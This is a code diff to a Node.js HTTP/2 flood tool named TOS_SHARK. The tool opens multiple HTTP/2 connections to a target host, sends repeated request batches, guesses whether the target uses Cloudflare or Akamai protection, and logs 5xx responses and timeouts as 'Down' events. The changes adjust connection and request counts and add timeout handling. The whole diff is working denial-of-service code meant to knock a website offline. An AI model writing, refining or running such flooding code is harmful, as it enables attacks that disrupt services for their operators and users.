@@ -7,18 +7,33 @@ class TOS_SHARK {
         this.host = url.hostname;
         this.running = true;
         this.totalReqs = 0;
-        this.startTime = Date.now();
         this.lastLog = Date.now();
         this.reqCounter = 0;
+        
+        // Detect protection
+        this.protection = this.detectProtection();
+        this.mtCode = this.getMTCode();
         
         // H2 Connections
         this.conns = [];
         
         // Print header once
-        console.log('TØS-SHARK | CUSTOM | MT-3M22');
+        console.log(`TØS-SHARK | ${this.protection} | MT-${this.mtCode}`);
         console.log('-----------------------------------------------------------------');
         
         this.start();
+    }
+
+    detectProtection() {
+        // Simple detection based on hostname patterns
+        if (this.host.includes('cloudflare') || this.host.includes('cf-')) return 'CF';
+        if (this.host.includes('akamai') || this.host.includes('akamaized')) return 'AKAMAI';
+        return 'CUSTOM';
+    }
+
+    getMTCode() {
+        const codes = { 'CF': '1M22', 'AKAMAI': '2M11', 'CUSTOM': '3M22' };
+        return codes[this.protection] || '3M22';
     }
 
     color(t, c) {
@@ -27,8 +42,8 @@ class TOS_SHARK {
     }
 
     start() {
-        // Setup 10 H2 connections
-        for (let i = 0; i < 10; i++) {
+        // Setup 5 H2 connections
+        for (let i = 0; i < 5; i++) {
             try {
                 const client = http2.connect(this.target);
                 client.setMaxListeners(1000);
@@ -53,9 +68,12 @@ class TOS_SHARK {
                 continue;
             }
             
-            // Send 50 requests per tick
-            for (let i = 0; i < 50; i++) {
+            // Send requests
+            for (let i = 0; i < 20; i++) {
                 const client = this.conns[Math.floor(Math.random() * this.conns.length)];
+                
+                this.reqCounter++;
+                this.totalReqs++;
                 
                 try {
                     const req = client.request({
@@ -64,22 +82,28 @@ class TOS_SHARK {
                         ':authority': this.host
                     });
                     
-                    this.reqCounter++;
-                    this.totalReqs++;
-                    
                     req.on('response', (headers) => {
                         const status = headers[':status'];
                         this.logStatus(status);
                     });
                     
-                    req.on('error', () => {
-                        this.logStatus('ERROR');
+                    req.on('error', (err) => {
+                        // Connection error = TIMEOUT
+                        this.logStatus('TIMEOUT');
                     });
+                    
+                    // Timeout after 5 seconds
+                    setTimeout(() => {
+                        if (!req.destroyed) {
+                            req.destroy();
+                            this.logStatus('TIMEOUT');
+                        }
+                    }, 5000);
                     
                     req.end();
                     
                 } catch (e) {
-                    this.totalReqs++;
+                    this.logStatus('TIMEOUT');
                 }
             }
             
@@ -93,9 +117,10 @@ class TOS_SHARK {
             this.lastLog = now;
             
             let color = 'g', text = status;
-            if (status === 'ERROR') {
+            
+            if (status === 'TIMEOUT') {
                 color = 'r';
-                text = 'ERROR';
+                text = 'TIMEOUT';
             } else if (status >= 500) {
                 color = 'r';
             } else if (status >= 400) {
@@ -104,9 +129,9 @@ class TOS_SHARK {
             
             console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
             
-            // Down event
-            if (color === 'r' && (status >= 500 || status === 'ERROR')) {
-                console.log(this.color(`{3M22-${this.reqCounter} --> ${status}}`, 'r'));
+            // Down event (only for 5xx or TIMEOUT)
+            if (color === 'r' && (status >= 500 || status === 'TIMEOUT')) {
+                console.log(this.color(`{${this.mtCode}-${this.reqCounter} --> ${status}}`, 'r'));
             }
         }
     }
